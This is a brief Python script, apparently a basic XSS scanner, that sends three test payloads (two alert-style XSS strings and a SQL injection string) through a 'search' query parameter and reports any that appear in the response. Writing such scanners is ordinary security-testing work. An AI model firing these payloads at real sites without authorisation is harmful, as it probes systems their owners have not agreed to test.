import requests

def xss_scanner(url):
    payloads = ["<script>alert('XSS')</script>", "' OR '1'='1", "<img src='x' onerror='alert(1)'>"]
    for payload in payloads:
        response = requests.get(url, params={'search': payload})
        if payload in response.text:
            print(f"Potential XSS vulnerability with payload: {payload}")